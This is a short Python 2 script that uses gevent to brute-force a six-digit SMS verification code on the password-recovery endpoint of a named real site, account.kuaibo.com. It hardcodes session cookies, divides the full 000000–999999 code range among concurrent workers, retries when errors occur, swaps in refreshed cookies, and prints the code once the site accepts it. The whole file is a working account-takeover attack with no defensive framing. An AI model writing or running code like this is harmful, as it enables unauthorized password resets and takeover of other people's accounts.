#coding=utf8
import gevent
from gevent import monkey
monkey.patch_all()
import sys
import time
import requests
cookies = {
    'session':'"nB7RddrciKg0TsMVnaL2jQfdiIs=?asc_captcha=Uyd4M2NwJwpwMQou"',
    'tk':'9826098dfV08Pyx4501CBCE8DE4AD36CD3F358857AAD726',
    'pdf':'ABF566A191754FF0121AC35148FECD0A'
}
break_flag = False
def decode_psw(threads_count=10):
    """
    采用暴力破解手机验证码
    Args:
        threads_count:启用的线程数，默认为10个，type=int
    这里用gevent的线程
    """
    threads_lt = []
    step = 1000000/threads_count
    for i in range(0, 1000000, step):
        thread = gevent.spawn(multi_decode, i, min(1000000, i + step))
        threads_lt.append(thread)
    gevent.joinall(threads_lt)


def multi_decode(begin, end):
    """测试的数字区间
    Args:
        begin:从这个数字开始测试一直到 end
        type=int
    """
    global cookies
    global break_flag
    for i in range(end-1, begin+1, -1):
        if break_flag:
            break
        code = "%06d" % i
        while 1:
            r=requests.post('http://account.kuaibo.com/passwd_mgr/passwd_find/way_mobile/',
                            data={'mobile_captcha':code},
                            cookies=cookies
                            )
            ret = r.json()
            if ret.get('ok'):
                print code, 'find , Oh yeah!!!'
                break_flag=True
            if i % 1000 == 0:
                print i, 'pass'
            if not ret.get('ok') and not isinstance(ret.get('reason'), unicode) :
            #异常了
                time.sleep(1)
                print 'time sleep(1)'
            else:
                break
            response_cookies = r.cookies.get_dict()
            if response_cookies:
                cookies = response_cookies

if __name__ == '__main__':
    argv = sys.argv
    threads_count = 10
    if len(argv)>1 and argv[1]:
        threads_count = int(argv[1])
    decode_psw(threads_count)





